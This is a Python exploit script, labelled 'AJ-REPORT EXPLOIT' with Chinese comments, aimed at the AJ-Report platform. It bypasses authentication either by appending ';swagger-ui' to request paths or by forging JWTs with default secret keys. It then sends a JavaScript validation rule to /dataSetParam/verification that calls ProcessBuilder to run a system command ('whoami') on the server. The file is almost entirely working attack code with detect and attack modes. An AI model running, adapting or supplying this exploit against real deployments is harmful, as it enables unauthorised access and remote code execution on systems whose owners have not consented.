# SQUIRT1E
import json
import jwt
import requests
import argparse

def getConfig():
    f_config = open("./config.json")
    return json.load(f_config)

def getFakeToken():
    payload = {
        "type": 0,
        "uuid": "627750b8be86421d94facec7e4dba555",
        "tenant": "tenantCode",
        "username": "admin"
    }
    fakeToken = jwt.encode(payload,jwtSecret,algorithm='HS256')
    return fakeToken

def getFakeShareToken():
    payload = {
        "shareCode": 1,
        "reportCode": "/",
        "exp": 4070880000,
        "iat": 1715402146,
        "sharePassword": 1
    }
    fakeShareToken = jwt.encode(payload,JWT_SECRET,algorithm='HS256')
    return fakeShareToken

def defaultJWTKeyDetect():
    
    response = requests.get(attack_url+"/health",headers=headers)
    if "status" not in response.text:
        print("不是默认key")
    
    print("存在jwt伪造漏洞")

def swaggerDetect():
    
    response = requests.get(attack_url+"/health;swagger-ui",headers=headers)
    if "status" not in response.text:
        print("不存在swagger-ui截断鉴权绕过漏洞")
    
    print("存在swagger-ui截断鉴权绕过漏洞")


def defaultJWTKeyAttack():

    response = requests.post(attack_url+"/dataSetParam/verification",headers=headers,json=evil_payload)
    
    print("执行结果： "+response.text)

def swaggerAttack():
    
    response = requests.post(attack_url+"/dataSetParam/verification;swagger-ui",headers=headers,json=evil_payload)
    print("执行结果： "+response.text)


def getArgs():
    # 1. 定义命令行解析器对象
    parser = argparse.ArgumentParser(description='AJ-REPORT EXPLOIT.')
 
    # 2. 添加命令行参数
    parser.add_argument('-u','--url', type=str, required=True , help="url")
    parser.add_argument('-m','--mode',type=str,default="detect",help="detect:检测  attack:攻击")
    parser.add_argument('-b','--bypass', type=str, default="bypass1",help="bypass1:swagger-ui截断绕过  bypass2:jwt默认key伪造")   #默认;swagger-ui截断绕过
 
    # 3. 从命令行中结构化解析参数
    args = parser.parse_args()
    return args

if __name__ == "__main__":
    config = getConfig()

    jwtSecret = config["jwtSecret"]
    JWT_SECRET = config["JWT_SECRET"]
    fakeToken = getFakeToken()
    fakeShareToken = getFakeShareToken()
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    }

    args = getArgs()
    attack_url = args.url
    bypass_mode = args.bypass

    if args.mode == "detect":
        if bypass_mode == "bypass1":
            swaggerDetect()
        elif bypass_mode == "bypass2":
            headers["Share-Token"] = fakeShareToken
            headers["Authorization"] = fakeToken
            defaultJWTKeyDetect()
    elif args.mode == "attack":
        evil_payload = {
            "sampleItem":"1",
            "validationRules":"function verification(data){var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\"js\").eval(\"new java.lang.Proces\"+\"sBuilder('whoami').start().getInputStream();\");result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss='';while((line = result.readLine()) != null){ss+=line};return ss;}"
        }
        if bypass_mode == "bypass1":
            swaggerAttack()
        elif bypass_mode == "bypass2":
            headers["Share-Token"] = fakeShareToken
            headers["Authorization"] = fakeToken
            defaultJWTKeyAttack()
